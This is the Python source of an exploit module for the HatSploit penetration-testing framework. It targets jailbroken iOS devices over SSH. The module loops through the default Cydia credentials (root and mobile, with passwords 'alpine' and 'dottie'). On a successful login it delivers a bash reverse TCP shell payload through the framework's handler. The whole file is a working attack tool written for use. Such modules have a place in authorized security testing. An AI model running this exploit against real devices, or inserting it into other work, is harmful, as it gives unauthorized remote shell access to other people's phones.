"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.ssh import SSHClient


class HatSploitModule(Module, SSHClient, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "iOS SSH Cydia.app Default Password",
            'Module': "exploit/apple_ios/ssh/cydia_default_password",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Bypass iOS SSH authorization using Cydia.app default SSH password.",
            'Platform': "apple_ios",
            'Rank': "medium",
        }

        self.payload = {
            'Value': "unix/generic/bash_reverse_tcp",
            'Architectures': ['armle', 'aarch64', 'generic'],
            'Platforms': ['apple_ios', 'unix'],
            'Action': "phaseless",
            'Types': None,
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 22,
                'Type': "port",
                'Required': True,
            },
        }

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        credentials = [
            ('root', 'dottie'),
            ('root', 'alpine'),
            ('mobile', 'dottie'),
            ('mobile', 'alpine'),
        ]

        self.print_process(f"Exploiting {remote_host}...")

        for account in credentials:
            self.print_process(f"Attempt to log in as {account[0]}:{account[1]}...")

            client = self.open_ssh(remote_host, remote_port, account[0], account[1])

            try:
                client.connect()

                self.print_success(f"Logged in via {account[0]}:{account[1]}!")

                self.module_handle(
                    module=self,
                    sender=client.send_command
                )

                client.disconnect()
                break

            except RuntimeError:
                self.print_error(f"Failed to log in via {account[0]}:{account[1]}!")
